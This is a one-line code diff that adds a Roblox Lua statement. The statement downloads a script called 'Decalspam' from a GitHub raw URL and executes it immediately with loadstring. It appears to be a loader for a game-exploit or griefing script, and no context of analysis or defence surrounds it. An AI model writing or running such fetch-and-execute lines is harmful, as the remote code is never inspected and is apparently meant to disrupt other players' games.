@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/C00lguidos/fb22aa96b1d804401e29fc53424aa9ab1c4f6c32/Decalspam"))()
